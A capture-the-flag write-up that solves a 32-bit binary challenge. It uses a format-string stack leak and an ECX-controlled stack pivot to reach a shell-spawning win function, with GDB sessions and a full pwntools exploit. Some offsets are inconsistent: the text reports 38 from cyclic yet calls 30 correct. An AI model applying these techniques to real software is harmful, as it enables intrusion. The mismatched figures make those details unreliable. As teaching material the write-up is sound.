# Old School PWN - Complete Writeup

**Challenge**: old_school

**Category**: Binary Exploitation

**Technique**: Stack Pivot via ECX Control + Format String Leak

**Difficulty**: Medium

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [The Impossible Constraint](#the-impossible-constraint)
4. [Discovery: Non-Standard Epilogue](#discovery-non-standard-epilogue)
5. [Exploitation Strategy](#exploitation-strategy)
6. [Step-by-Step Walkthrough](#step-by-step-walkthrough)
7. [Common Questions Answered](#common-questions-answered)
8. [Complete Exploit](#complete-exploit)
9. [Key Takeaways](#key-takeaways)

---

## Challenge Overview

### Binary Information

```bash
file main
# ELF 32-bit LSB executable, Intel 80386, dynamically linked

# Check security
checksec main
```

**Security Mitigations:**
```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
```

**Key Points:**
- ✅ No PIE → Fixed addresses
- ✅ No Canary → Direct overflow possible
- ❌ NX enabled → No shellcode on stack

---

## Initial Analysis

### Decompiled Code (Ghidra)

**Main function:**

```c
undefined4 main(void)
{
  int iVar1;
  char local_2e [15];  // Buffer at [EBP-0x2e]
  char local_1f [15];  // Buffer at [EBP-0x1f]

  puts("simple pwn... no trickery needed...");

  gets(local_1f);      // Vulnerability #1: Buffer overflow
  printf(local_1f);    // Vulnerability #2: Format string

  printf("\nsay yer magic words: ");

  gets(local_2e);      // Vulnerability #3: Buffer overflow
  printf(local_2e);    // Vulnerability #4: Format string

  iVar1 = strcmp(local_1f,"hehehehehehehe");
  if ((iVar1 == 0) && (iVar1 = strcmp(local_2e,"huhuhuhuhuhu"), iVar1 == 0)) {
    puts("how do you even do that?");
    win(local_1f);
    return 0;
  }

  puts("expected tbh...");
  return 0;
}
```

**Win function:**

```c
void win(char *param_1)
{
  int iVar1;

  iVar1 = strcmp(param_1,"hwhwhwhwhwhw");
  if (iVar1 == 0) {
    system("/bin/sh");  // Goal!
  }
  return;
}
```

**Finding addresses with Ghidra:**

```bash
# Find win function
ghidra_find_function_by_name win
# Output: 080491b6: win

# Find magic string
ghidra_search_strings pattern="hwh"
# Output: 0804a008: "hwhwhwhwhwhw"
```

---

## The Impossible Constraint

### The Paradox

To reach `win()`, we need:
1. `local_1f == "hehehehehehehe"` (14 chars)
2. `local_2e == "huhuhuhuhuhu"` (12 chars)

But `win()` is called with `win(local_1f)`, and win() requires:
3. `param_1 == "hwhwhwhwhwhw"` (12 chars)

**Problem:** `local_1f` can't be both "hehehehehehehe" AND "hwhwhwhwhwhw"!

### The Solution

**The strcmp checks are a red herring!**

We don't satisfy them - we **bypass** them by hijacking control flow!

---

## Discovery: Non-Standard Epilogue

### Disassembling the Function End

```bash
objdump -d main -M intel | grep -A 15 "lea.*esp.*ebp-0x8"
```

**Output:**
```assembly
8049312:    lea    esp,[ebp-0x8]     ; ESP = EBP - 8
8049315:    pop    ecx                ; ECX = [EBP-8]  ← KEY!
8049316:    pop    ebx
8049317:    pop    ebp
8049318:    lea    esp,[ecx-0x4]      ; ← STACK PIVOT!
804931b:    ret                       ; Jump to [ECX-4]
```

### Why This is Different

**Standard epilogue:**
```assembly
mov esp, ebp
pop ebp
ret              ; Returns to [EBP+4]
```

**This binary's epilogue:**
```assembly
lea esp,[ebp-0x8]
pop ecx          ; ECX from [EBP-8]
lea esp,[ecx-0x4]  ; ESP = ECX - 4
ret              ; Returns to [ECX-4], NOT [EBP+4]!
```

**Critical insight:** The return address is controlled by ECX, not the traditional location!

### Stack Layout

```
[EBP-0x8]   ← Saved ECX (controls stack pivot!)
[EBP-0x17]  ← local_1f (15 bytes)
[EBP-0x26]  ← local_2e (15 bytes) ← We overflow from here
```

**Distance from buffer to ECX:**
```
0x26 - 0x8 = 0x1E = 30 bytes
```

At offset 30, we overwrite saved ECX!

---

## Exploitation Strategy

### The Stack Pivot Technique

**Goal:** Control ECX to pivot the stack to our fake frame.

**Payload structure:**

```
[Offset 0-3]:   win_addr (0x080491b6)     ← Fake return address
[Offset 4-7]:   fake_return (0xdeadbeef)
[Offset 8-11]:  magic_string (0x0804a008) ← Parameter to win()
[Offset 12-29]: padding ('A' * 18)
[Offset 30-33]: buffer_addr + 4           ← Overwrites ECX!
```

**How it works:**

1. Overflow writes to `local_2e` buffer
2. At offset 30, overwrites saved ECX
3. Epilogue:
   - `pop ecx` → ECX = buffer_addr + 4
   - `lea esp,[ecx-0x4]` → ESP = buffer_addr
   - `ret` → Jumps to [buffer_addr] = win_addr
4. win() reads param from [ESP+4] = magic_string
5. strcmp passes → shell!

---

## Step-by-Step Walkthrough

### Step 1: Find Buffer Offset (GDB)

```bash
pwndbg main
break *main+153    # After second gets()
run

# First input:
AAAA

# Second input (cyclic pattern):
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

# At breakpoint:
pwndbg> p/x $ebp
$1 = 0xffffcbc8

pwndbg> x/wx $ebp-0x26
0xffffcba2: 0x61616161    # Buffer start

pwndbg> x/wx $ebp-0x8
0xffffcbc0: 0x616b6161    # "aaka" - saved ECX

# Find offset:
pwndbg> cyclic -l 0x616b6161
Found at offset 38

# But we calculated ECX offset as:
# 0x26 - 0x8 = 0x1E = 30 bytes ✓ Correct!
```

### Step 2: Leak Stack Address (Format String)

**Test different format string offsets:**

```python
from pwn import *
for i in range(1, 20):
    io = process('./main')
    io.recvuntil(b'...\n')
    io.sendline(f'%{i}$p'.encode())
    result = io.recvline()
    io.close()
    print(f"%{i:2d}$p -> {result.strip()}")
```

**Result:** `%12$p` gives us a stack address!

**Measure the offset in GDB:**

```bash
pwndbg main
break *main+115    # After first printf
run

# Input:
%12$p

# At breakpoint:
pwndbg> info frame
Stack level 0, frame at 0xffffcbe0:    ← Leaked value

pwndbg> x/wx $ebp-0x26
0xffffcba2:    # Buffer address

# Calculate offset:
pwndbg> p/d 0xffffcbe0 - 0xffffcba2
$1 = 62    ← LEAK OFFSET!
```

**Formula:** `buffer_addr = leaked_value - 62`

### Step 3: Verify Stack Pivot in GDB

Create test input:

```python
from pwn import *

leaked = 0xffffcbe0
buffer_addr = leaked - 62

WIN = 0x080491b6
MAGIC = 0x0804a008

payload1 = b'%12$p\n'
payload2 = p32(WIN) + p32(0xdeadbeef) + p32(MAGIC)
payload2 += b'A' * 18
payload2 += p32(buffer_addr + 4)
payload2 += b'\n'

with open('/tmp/input.txt', 'wb') as f:
    f.write(payload1 + payload2)
```

**Test in GDB:**

```bash
pwndbg main
break *0x08049318    # At stack pivot instruction
run < /tmp/input.txt

# At breakpoint:
pwndbg> info registers ecx
ecx    0xffffcba6    # Our controlled value!

pwndbg> x/4wx $ecx-0x4
0xffffcba2:    0x080491b6    0xdeadbeef    0x0804a008    0x41414141
                ^win          ^fake_ret     ^magic_str

# Step to execute pivot:
pwndbg> si

# Now ESP points to our fake stack:
pwndbg> info registers esp
esp    0xffffcba2

# Step ret:
pwndbg> si

# Now in win()!
pwndbg> info registers eip
eip    0x80491b6    # win function!

# Check parameter:
pwndbg> x/wx $esp+4
0xffffcbaa:    0x0804a008    # Pointer to magic string

pwndbg> x/s 0x0804a008
"hwhwhwhwhwhw"    ✓ Correct!

# Continue:
pwndbg> c
process 12345 is executing new program: /usr/bin/dash
# Shell spawned! ✓
```

---

## Common Questions Answered

### Q1: Why does simple overflow fail?

**Answer:** Because the return address is NOT at [EBP+4]!

**Normal function:**
- Return address at [EBP+4]
- Overflow → overwrite [EBP+4] → control execution

**This function:**
- Return address at [ECX-4]
- Overwriting [EBP+4] does nothing!
- Must control ECX at [EBP-8]

### Q2: Is [EBP+4] equal to [ECX-4]?

**In normal execution:** YES
- ECX points to original stack
- ECX-4 = return address = [EBP+4]

**With our exploit:** NO
- We overwrite ECX with buffer_addr + 4
- ECX-4 = buffer_addr (our fake stack)
- [EBP+4] = original return (ignored)

### Q3: What is "magic string"?

Just a nickname for "hwhwhwhwhwhw" - the password win() checks.

- Address: 0x0804a008
- We pass a POINTER to it, not the string itself
- `p32(0x0804a008)` ← correct
- `b"hwhwhwhwhwhw"` ← wrong

### Q4: Why format string offset 12?

**What %12$p means:**
- Print the 12th argument
- 12th arg is at ESP+48 (12 * 4 bytes)

**Why offset 12:**
- Tested offsets 1-20
- %12$p gives stack address
- Has fixed offset (62 bytes) from buffer
- Works consistently with ASLR

**How to find:**
```python
for i in range(1, 30):
    test(f'%{i}$p')
    # Find which gives useful stack address
```

---

## Complete Exploit

```python
#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'i386'
context.log_level = 'info'

binary = './main'
elf = ELF(binary)

# Addresses
WIN_ADDR = 0x080491b6
MAGIC_STRING = 0x0804a008

# Measured offsets
LEAK_OFFSET = 62
ECX_OFFSET = 30

def build_payload(buffer_addr):
    # Fake stack frame
    fake_stack = flat([
        WIN_ADDR,        # Return address
        0xdeadbeef,      # Fake return from win
        MAGIC_STRING,    # Parameter to win()
    ])

    # Pad and overwrite ECX
    payload = fake_stack + b'A' * (ECX_OFFSET - len(fake_stack))
    payload += p32(buffer_addr + 4)

    return payload

def exploit():
    io = process(binary)

    info("OLD SCHOOL PWN - Stack Pivot Exploitation")

    # Stage 1: Leak stack address
    io.recvuntil(b'...\n')
    io.sendline(b'%12$p')

    output = io.recvuntil(b'say yer magic words:')
    match = re.search(rb'0x[0-9a-f]+', output)

    if not match:
        error("Failed to leak!")
        return

    leaked_addr = int(match.group(), 16)
    buffer_addr = leaked_addr - LEAK_OFFSET

    success(f"Leaked: {hex(leaked_addr)}")
    success(f"Buffer: {hex(buffer_addr)}")

    # Stage 2: Send exploit
    payload = build_payload(buffer_addr)
    io.sendline(payload)

    success("Exploit sent! Dropping to shell...")
    io.interactive()

if __name__ == '__main__':
    exploit()
```

**Usage:**
```bash
chmod +x exploit.py
python3 exploit.py
```

---

## Key Takeaways

### 1. Always Disassemble

Don't assume standard calling conventions. Custom epilogues can create unique exploitation opportunities.

### 2. Red Herrings Exist

The "impossible" strcmp constraints were a distraction. Think creatively about bypassing checks entirely.

### 3. Stack Pivots

By controlling one register (ECX), we redirected the entire execution flow. Stack pivots are powerful!

### 4. Format Strings

Format string leaks defeat ASLR. Always test different offsets to find useful values.

### 5. Combine Primitives

This exploit used BOTH vulnerabilities:
- Format string → Leak address
- Buffer overflow → Stack pivot

Neither alone would work!

### 6. GDB is Essential

Dynamic analysis verifies:
- Exact offsets
- Stack layouts
- Exploit success

Always test in GDB first!

---

## Command Reference

### Binary Analysis
```bash
file main
checksec main
objdump -d main -M intel | less
readelf -a main
```

### Ghidra
```bash
ghidra_list_functions
ghidra_decompile_function 0x080491f9
ghidra_search_strings pattern="hwh"
```

### GDB
```bash
pwndbg main
break *main+153
run
cyclic 100
cyclic -l 0x61616161
info frame
info registers
x/40wx $esp
```

### Exploit Dev
```python
# Cyclic pattern
from pwn import *
print(cyclic(100))

# Test format strings
for i in range(1,20):
    send(f'%{i}$p')
```

---

**Challenge Completed!** 🎉

Shell obtained through creative stack pivoting!
